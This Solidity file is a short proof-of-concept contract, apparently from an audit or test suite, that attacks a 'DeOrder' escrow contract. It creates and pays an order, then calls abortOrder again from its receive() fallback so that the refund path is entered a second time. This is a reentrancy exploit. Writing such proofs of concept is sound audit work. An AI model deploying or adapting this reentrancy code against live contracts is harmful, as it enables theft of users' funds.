import {DeOrder} from "contracts/DeOrder.sol";
import {WETH} from "contracts/mock/WETH.sol";
import "contracts/interface/IOrder.sol";

contract AttackAbortOrder {
    DeOrder public deOrder;
    WETH public weth;

    constructor(DeOrder _deOrder, WETH _weth) {
        deOrder = _deOrder;
        weth = _weth;
    }

    function start(
        address worker,
        uint256[] memory _amounts,
        uint256[] memory _periods,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) public payable{
        deOrder.createOrder(
            0,
            address(this),
            address(worker),
            address(0),
            1 ether
        );
        deOrder.permitStage(
            2,
            _amounts,
            _periods,
            PaymentType.Due,
            0,
            20000,
            v,
            r,
            s
        );
        deOrder.payOrder{value: 1 ether}(2, 1 ether); // pay
        deOrder.startOrder(2); // start order
    }

    // receive() external payable {}
    receive() external payable {
        if (weth.totalSupply() >= 1 ether) {
            deOrder.abortOrder(2);
        }
    }
    
    function attack() external payable {
        deOrder.abortOrder(2);
    }
}
